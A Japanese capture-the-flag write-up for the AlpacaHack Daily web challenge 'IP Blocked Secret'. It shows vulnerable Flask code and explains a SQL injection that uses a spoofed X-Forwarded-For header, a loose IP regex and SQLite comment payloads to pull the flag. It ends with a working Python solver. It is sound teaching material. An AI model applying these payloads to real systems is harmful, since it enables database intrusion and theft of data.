---
title: "IP Blocked Secret - AlpacaHack Daily"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "alpacahack", "sqli", "render-template", "regex", "web-exploitation"]
summary: "web writeup for \"IP Blocked Secret\" from AlpacaHack Daily - techniques: alpacahack, sqli, render-template, regex, web-exploitation."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d05_IP_Blocked_Secret/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "IP Blocked Secret"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** IP Blocked Secret
- **Date:** 2026-07-05
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d05_IP_Blocked_Secret>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d05_IP_Blocked_Secret/README.md>

---
# IP Blocked Secret

今回も難しい問題でしたが、なんとか解くことができました！

## 問題

これまで以上に安全です！

```py
IPV4_RE = re.compile(r"\d{,3}.\d{,3}.\d{,3}.\d{,3}", re.ASCII)

@app.get("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    sid = session.get("sid", None)
    if not IPV4_RE.fullmatch(ip):
        return "Invalid IP", 400
        
    data = g.db.execute(f"""
        SELECT secret, ip FROM secrets WHERE id='{sid}'
    """).fetchone()
    if not data:
        return render_template_string(INDEX, secret="No secret yet")
    
    if ip != data["ip"]:
        return "Unauthorized", 403
    
    return render_template_string(INDEX, secret=data["secret"])

@app.post("/set")
def set():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    secret = request.form.get("secret", "")
    if not IPV4_RE.fullmatch(ip):
        return "Invalid IP", 400
    
    secret = secret.replace("'", "''")
    cur = g.db.execute(f"""
        INSERT INTO secrets (ip, secret)
        VALUES ('{ip}', '{secret}')
        ON CONFLICT(ip) DO UPDATE SET
            secret = excluded.secret
        RETURNING id
    """)
    session["sid"] = cur.fetchone()["id"]
    g.db.commit()
    return redirect(url_for("index"))
```

## 概要

secret欄に入力、送信した文字列がデータベースのsecretsテーブルに登録され、最新のものがルートページの先頭に`Your current secret: `として表示されるようになっています。

set()の処理にあるINSERT文の作成にプレースホルダが使われていないので、
```
secret = ' || (select flag from flag) || '
```
のようにSQLインジェクションすれば、
```
        INSERT INTO secrets (ip, secret)
        VALUES ('172.18.0.1', '' || (select flag from flag) || '')
        ON CONFLICT(ip) DO UPDATE SET
            secret = excluded.secret
        RETURNING id
```
のようになり、secretsテーブルにフラグを書き込んで確認できそうな気がします。

しかし、その直前の
```py
    secret = secret.replace("'", "''")
```
によりシングルクオートがエスケープされてしまっているので、
```
Your current secret: ' || (select flag from flag) || '
```
そのままでてきてしまいました。

`X-Forwarded-For`ヘッダーをいじってIPを偽装しようにも、正規表現でIPアドレスの形式であるか確認しているので無理っぽいです。

どうすればsecretsテーブルにフラグを書き込むことができるのでしょうか？

## 解法

まず、問題となっている正規表現
```py
IPV4_RE = re.compile(r"\d{,3}.\d{,3}.\d{,3}.\d{,3}", re.ASCII)
```
の書き方にものすごい違和感がありました。

正しくはこうですよね？
```py
IPV4_RE = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", re.ASCII)
```
配布ソースの書き方だと、

- `.`は任意の1文字にマッチしてしまう。
- 数字は1～3文字でなく0～3文字なので無くてもマッチしてしまう。

といった問題点があります。

つまり、IPアドレスっぽい文字列でなくても、任意の3文字であればチェックを通ることができてしまいます。
```py
import re

IPV4_RE = re.compile(r"\d{,3}.\d{,3}.\d{,3}.\d{,3}", re.ASCII)
ip = "abc"
print(re.fullmatch(IPV4_RE, ip) is not None) # True
```

というわけで、`X-Forwarded-For`ヘッダーを偽装してipを`'/*`にすることを考えてみます。

※SQLiteでは`/* ... */`はコメント扱いになります。

すると、
```
        INSERT INTO secrets (ip, secret)
        VALUES (''/*', 'SECRET')
        ON CONFLICT(ip) DO UPDATE SET
            secret = excluded.secret
        RETURNING id
```
になり、例えばsecretを`*/, 123 ) --`のようにして`*/`で受けてあげれば、
```
        VALUES (''/*', '*/, 123 ) --')
```
になりますが、これは実質
```
        VALUES ('', 123 )
```
と同じになります。

この`123`のところをフラグにしたいので、まとめると、
```
ip: '/*
secret: */, (select flag from flag) ) --
```
とすればいいのではないでしょうか？

さっそくPythonのrequestsモジュールを使って解いてみます。
```py
import requests

URL = "http://localhost:3000/"

s = requests.Session()
s.get(URL)

headers = {"X-Forwarded-For": "'/*"}
data = {"secret": "*/, (select flag from flag)) --"}
res = s.post(URL + "set", headers=headers, data=data)
print(res.text)
```
```
Unauthorized
```
なんですってー！？Unauthorizedって何ですか？

ソースコードのこの文字列の出現個所を見てみると、
```py
    if ip != data["ip"]:
        return "Unauthorized", 403
```
ルートにアクセスしたとき、IPアドレス(自己申告)と登録されたIPが同じでなく弾かれてしまったのが原因だとわかりました。

よって、最後にフラグを表示するとき、登録されたIPに合わせて`X-Forwarded-For`ヘッダーを偽装しなおす必要があります。

私はここでかなり苦戦しました。

この偽装しなおしたIPアドレスも例の正規表現のルールに従う必要があります。

ipにはこれ以上文字を増やせないし、secretはシングルクオートがエスケープされるので任意の文字列を用意することはできません。

しばらく悩んだ後、ふと、登録するIPを`'''`（シングルクオート3つ）にすればいいとひらめきました。

secretでは、シングルクオート1つが2つに増やされてしまいます。

これを逆手にとって、シングルクオート4つを8つに増やせば、シングルクオートに囲まれた6つのシングルクオート、文字列的には3つのシングルクオートにすることができます。

これを`||`で空文字列にコメント越しに結合してあげれば完成です。

これをもとに修正したソルバーは下記のようになります。
```py
import requests
import re

URL = "http://localhost:3000/"
# URL = "http://34.170.146.252:19956/"

s = requests.Session()
s.get(URL)

headers = {"X-Forwarded-For": "'/*"}
data = {"secret": "*/ || '''', (select flag from flag)) --"}
s.post(URL + "set", headers=headers, data=data)

headers = {"X-Forwarded-For": "'''"}
res = s.get(URL, headers=headers)
m = re.search(r"Your current secret:(.*)", res.text)
if m:
    print(m.group(0))
```
```
Your current secret: Alpaca{REDACTED}
```
